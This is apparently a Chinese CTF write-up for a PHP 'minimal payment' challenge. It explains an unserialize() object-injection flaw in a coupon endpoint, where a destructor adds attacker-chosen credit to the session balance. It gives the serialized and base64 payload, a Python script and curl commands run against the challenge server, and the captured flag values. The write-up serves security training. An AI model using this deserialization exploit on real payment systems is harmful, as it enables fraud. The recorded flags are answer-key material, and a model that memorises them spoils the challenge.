# 极简支付 WP

## 题目信息

- 目标地址：`120.27.146.76:17846`
- 附件：`./src`
- 最终拿到的远程 flag：`flag{bef761af00a931b3acd2966011351248}`

## 题目分析

先看首页初始化逻辑，在 `index.php` 里会给每个新会话分配一个 `user_id`，并把余额初始化为 `20`：

```php
session_start();
if (!isset($_SESSION['user_id'])) {
    $_SESSION['user_id'] = bin2hex(random_bytes(8));
    $_SESSION['balance'] = 20;
}
```

再看购买逻辑 `buy.php`：

```php
$items = [
    'basic_vip' => 10,
    'premium_vip' => 50,
    'flag' => 99999
];
```

`flag` 价格是 `99999`，正常情况下显然买不起，所以关键就是想办法把当前 session 里的 `balance` 抬高。

接着看优惠券接口 `api/apply_coupon.php`：

```php
$couponData = $_POST['coupon'] ?? '';
$decoded = base64_decode($couponData);
$promo = @unserialize($decoded);
```

这里直接对用户可控数据做了 `unserialize()`，而且在反序列化之前还 `include '../models.php';`，说明只要 `models.php` 里存在可利用类，就有机会打对象注入。

`models.php` 内容如下：

```php
class PromoManager {
    public $promo_credit;
    public $promo_code;

    public function __construct($code, $credit) {
        $this->promo_code = $code;
        $this->promo_credit = $credit;
    }

    function __destruct() {
        if(isset($this->promo_credit) && is_numeric($this->promo_credit)) {
            $_SESSION['balance'] += intval($this->promo_credit);
        }
    }
}
```

可以看到 `__destruct()` 在对象销毁时会直接把 `promo_credit` 加到 `$_SESSION['balance']` 里，而且只有一个很宽松的 `is_numeric()` 判断，没有签名校验、没有优惠券来源校验、也没有额度限制。

这就很直接了：

1. 构造一个 `PromoManager` 对象
2. 让 `promo_credit` 等于一个足够大的数字，比如 `100000`
3. 序列化后再 base64 编码
4. 提交给 `/api/apply_coupon.php`
5. 等脚本结束触发 `__destruct()`，当前 session 余额就会增加
6. 保持同一个 session 去请求 `/buy.php` 购买 `flag`

## 利用点总结

漏洞本质是：

- 用户可控数据进入 `unserialize()`
- 可利用类在当前上下文已加载
- 析构函数带有可利用副作用
- 副作用直接修改服务端 session 余额

这是一个非常典型的 PHP 反序列化 + 魔术方法利用场景。

## 构造 Payload

目标对象：

```php
new PromoManager("a", 100000)
```

对应的序列化结果：

```text
O:12:"PromoManager":2:{s:12:"promo_credit";i:100000;s:10:"promo_code";s:1:"a";}
```

Base64 编码后为：

```text
TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEyOiJwcm9tb19jcmVkaXQiO2k6MTAwMDAwO3M6MTA6InByb21vX2NvZGUiO3M6MToiYSI7fQ==
```

## 利用过程

### 1. 先访问首页，拿到会话

必须先获取 `PHPSESSID`，后面加余额和购买都要复用同一个 session。

### 2. 提交恶意优惠券

向 `/api/apply_coupon.php` 发送：

```http
POST /api/apply_coupon.php
Content-Type: application/x-www-form-urlencoded

coupon=TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEyOiJwcm9tb19jcmVkaXQiO2k6MTAwMDAwO3M6MTA6InByb21vX2NvZGUiO3M6MToiYSI7fQ==
```

脚本结束时触发 `PromoManager::__destruct()`，余额从 `20` 变为 `100020`。

### 3. 用同一个 session 购买 flag

向 `/buy.php` 发送：

```http
POST /buy.php
Content-Type: application/x-www-form-urlencoded

item=flag
```

## 复现脚本

下面是我本地打远程时使用的 Python 脚本：

```python
import base64
import requests

url = "http://120.27.146.76:17846"
s = requests.Session()

raw = 'O:12:"PromoManager":2:{s:12:"promo_credit";i:100000;s:10:"promo_code";s:1:"a";}'
payload = base64.b64encode(raw.encode()).decode()

s.get(url + "/")
r1 = s.post(url + "/api/apply_coupon.php", data={"coupon": payload})
print("[apply_coupon]", r1.text)

r2 = s.post(url + "/buy.php", data={"item": "flag"})
print("[buy_flag]", r2.text)
```

也可以直接用 `curl`：

```bash
curl -c cookie.txt http://120.27.146.76:17846/
curl -b cookie.txt -c cookie.txt -X POST http://120.27.146.76:17846/api/apply_coupon.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "coupon=TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEyOiJwcm9tb19jcmVkaXQiO2k6MTAwMDAwO3M6MTA6InByb21vX2NvZGUiO3M6MToiYSI7fQ=="
curl -b cookie.txt -X POST http://120.27.146.76:17846/buy.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "item=flag"
```

## 关于假 flag 的说明

`buy.php` 里有一段默认值：

```php
$flag = "flag{da91f6ee9d5cceef4705fd4f8af9e3f3}";
if (file_exists('/var/www/flag.php')) {
    include '/var/www/flag.php';
    if (isset($FLAG)) $flag = $FLAG;
}
```

本地附件里这个 `flag{da91f6ee9d5cceef4705fd4f8af9e3f3}` 只是兜底值，不一定是真 flag。

实际打远程时，服务端返回内容里先直接输出了真 flag：

```text
flag{bef761af00a931b3acd2966011351248}
```

后面 JSON 里仍然出现了源码中的默认 flag，所以不要被那个占位值带偏，提交时应以远程直接回显出来的真实 flag 为准。

## 最终结论

本题核心是 `apply_coupon.php` 中的 PHP 反序列化漏洞。通过构造 `PromoManager` 对象并控制 `promo_credit`，可以在析构时任意增加当前 session 的余额，随后直接购买高价商品 `flag`。

最终 flag：

```text
flag{bef761af00a931b3acd2966011351248}
```
